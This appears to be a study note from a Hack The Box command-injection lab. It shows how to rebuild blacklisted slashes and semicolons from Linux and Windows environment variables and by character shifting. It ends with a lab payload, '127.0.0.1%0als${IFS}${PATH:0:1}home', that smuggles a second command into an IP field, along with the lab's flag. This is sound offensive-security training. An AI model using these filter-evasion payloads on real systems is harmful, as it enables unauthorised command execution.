Besides injection operators and space characters, a very commonly blacklisted character is the slash (`/`) or backslash (`\`) character, as it is necessary to specify directories in Linux or Windows. We can utilize several techniques to produce any character we want while avoiding the use of blacklisted characters.

---

## Linux

There are many techniques we can utilize to have slashes in our payload. One such technique we can use for replacing slashes (`or any other character`) is throughÂ `Linux Environment Variables`Â like we did withÂ `${IFS}`. WhileÂ `${IFS}`Â is directly replaced with a space, there's no such environment variable for slashes or semi-colons. However, these characters may be used in an environment variable, and we can specifyÂ `start`Â andÂ `length`Â of our string to exactly match this character.

For example, if we look at theÂ `$PATH`Â environment variable in Linux, it may look something like the following:

```shell-session
smoothment@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

So, if we start at theÂ `0`Â character, and only take a string of lengthÂ `1`, we will end up with only theÂ `/`Â character, which we can use in our payload:


```shell-session
smoothment@htb[/htb]$ echo ${PATH:0:1}

/
```

```ad-note
**Note:**Â When we use the above command in our payload, we will not addÂ `echo`, as we are only using it in this case to show the outputted character.
```

We can do the same with theÂ `$HOME`Â orÂ `$PWD`Â environment variables as well. We can also use the same concept to get a semi-colon character, to be used as an injection operator. For example, the following command gives us a semi-colon:


```shell-session
smoothment@htb[/htb]$ echo ${LS_COLORS:10:1}

;
```

Exercise: Try to understand how the above command resulted in a semi-colon, and then use it in the payload to use it as an injection operator. Hint: TheÂ `printenv`Â command prints all environment variables in Linux, so you can look which ones may contain useful characters, and then try to reduce the string to that character only.

So, let's try to use environment variables to add a semi-colon and a space to our payload (`127.0.0.1${LS_COLORS:10:1}${IFS}`) as our payload, and see if we can bypass the filter:Â 

![Filter Operator](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_spaces_5.jpg)

As we can see, we successfully bypassed the character filter this time as well.

---

## Windows

The same concept works on Windows as well. For example, to produce a slash inÂ `Windows Command Line (CMD)`, we canÂ `echo`Â a Windows variable (`%HOMEPATH%`Â ->Â `\Users\htb-student`), and then specify a starting position (`~6`Â ->Â `\htb-student`), and finally specifying a negative end position, which in this case is the length of the usernameÂ `htb-student`Â (`-11`Â ->Â `\`) :

```cmd-session
C:\htb> echo %HOMEPATH:~6,-11%

\
```

We can achieve the same thing using the same variables inÂ `Windows PowerShell`. With PowerShell, a word is considered an array, so we have to specify the index of the character we need. As we only need one character, we don't have to specify the start and end positions:

```powershell-session
PS C:\htb> $env:HOMEPATH[0]

\


PS C:\htb> $env:PROGRAMFILES[10]
PS C:\htb>
```

We can also use theÂ `Get-ChildItem Env:`Â PowerShell command to print all environment variables and then pick one of them to produce a character we need.Â `Try to be creative and find different commands to produce similar characters.`

---

## Character Shifting

There are other techniques to produce the required characters without using them, likeÂ `shifting characters`. For example, the following Linux command shifts the character we pass byÂ `1`. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it withÂ `man ascii`), then add it instead ofÂ `[`Â in the below example. This way, the last printed character would be the one we need:

```shell-session
smoothment@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
smoothment@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```

We can use PowerShell commands to achieve the same result in Windows, though they can be quite longer than the Linux ones.

Exercise: Try to use the the character shifting technique to produce a semi-colonÂ `;`Â character. First find the character before it in the ascii table, and then use it in the above command.

# Question
---

![Pasted image 20250205141832.png](../../../../IMAGES/Pasted%20image%2020250205141832.png)

We can do the following payload:

```
127.0.0.1%0als${IFS}${PATH:0:1}home
```

```ad-important
#### Breakdown
---
### **Explanation**

1. **`%0a`**: New-line character to terminate the original command (e.g.,Â `ping 127.0.0.1`) and inject a new command.
    
2. **`ls`**: Command to list directories.
    
3. **`${IFS}`**: Replaces the space betweenÂ `ls`Â and the directory path.
    
4. **`${PATH:0:1}`**: Extracts the first character (`/`) from theÂ `PATH`Â environment variable.
    
5. **`home`**: Appended toÂ `${PATH:0:1}`Â to formÂ `/home`.
```

We'll see the following payload:

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.012 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.012/0.012/0.012/0.000 ms
1nj3c70r
```

Answer is `1nj3c70r`
